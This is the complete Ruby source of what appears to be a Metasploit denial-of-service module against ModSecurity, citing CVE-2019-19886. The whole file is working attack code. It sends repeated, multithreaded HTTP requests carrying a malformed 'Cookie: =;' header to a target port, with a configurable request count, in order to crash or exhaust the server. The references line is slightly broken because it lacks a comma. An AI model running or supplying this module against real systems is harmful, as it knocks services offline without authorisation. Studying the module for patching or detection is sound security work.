##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/Placidina/metasploit
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ModSecurity Malformed HTTP Cookie',
        'Author' => ['Alan Placidina Maria'],
        'References' => [
          ['CVE' '2019-19886']
        ],
        'DisclosureDate' => '2019-12-18'
      )
    )

    register_options(
      [
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 1000]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 1]),
        Opt::RPORT(80)
      ]
    )
  end

  def rlimit
    datastore['RLIMIT']
  end

  def thread_count
    datastore['THREADS']
  end

  def run
    starting_thread = 1
    while starting_thread < rlimit
      ubound = [rlimit - (starting_thread - 1), thread_count].min
      print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

      threads = []
      1.upto(ubound) do |i|
        threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
          connect
          sock.put("GET / HTTP/1.0\r\nCookie: =;\r\n\r\n")
          disconnect
        rescue StandardError => e
          print_error("DoS packet error: #{e}")
        ensure
          disconnect
        end
      end

      threads.each(&:join)
      print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
      starting_thread += ubound
    end
  end
end
